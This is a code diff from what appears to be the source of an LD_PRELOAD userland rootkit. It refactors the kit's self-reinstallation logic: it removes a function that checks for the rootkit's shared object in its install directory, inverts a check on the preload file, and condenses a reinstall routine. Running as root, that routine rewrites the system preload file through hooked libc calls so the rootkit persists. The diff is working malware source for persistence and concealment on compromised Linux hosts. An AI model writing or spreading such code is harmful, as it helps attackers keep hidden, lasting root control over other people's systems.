@@ -1,32 +1,6 @@
-int rknomore(void){
-    DIR *dp;
-    struct dirent *dir;
-    int status = 1;
-
-    hook(COPENDIR, CREADDIR);
-
-    dp = call(COPENDIR, INSTALL_DIR);
-    if(dp == NULL) // if we cant open installdir, rk-is-no-more
-        return status;
-
-    while((dir = call(CREADDIR, dp)) != NULL){
-        if(!strncmp(".", dir->d_name, 1))
-            continue;
-
-        // if we can detect the kits shared object, rk-is-more
-        if(strstr(dir->d_name, BDVLSO)){
-            status = -1;
-            break;
-        }
-    }
-    closedir(dp);
-
-    return status;
-}
-
-int preload_inconsistent(void){ // returns 1 if something is wrong with the preload file.
+int preloadok(void){ // returns 1 if something is wrong with the preload file.
     struct stat preloadstat;
-    int status = 0,
+    int status = 1,
         statret;
 
     hook(C__XSTAT);
@@ -34,15 +8,14 @@ int preload_inconsistent(void){ // returns 1 if something is wrong with the prel
     statret = (long)call(C__XSTAT, _STAT_VER, PRELOAD_FILE, &preloadstat);
 
     if((statret < 0 && errno == ENOENT) || preloadstat.st_size != strlen(SOPATH))
-        status = 1;
+        status = 0;
 
     return status;
 }
 
 void reinstall(void){
-    if(geteuid() != 0) return;
-    if(rknomore()) return;
-    if(!preload_inconsistent()) return;
+    if(not_user(0) || rknomore() || preloadok())
+        return;
 
     hook(CFOPEN, CFWRITE);
     FILE *ldfp = call(CFOPEN, PRELOAD_FILE, "w");
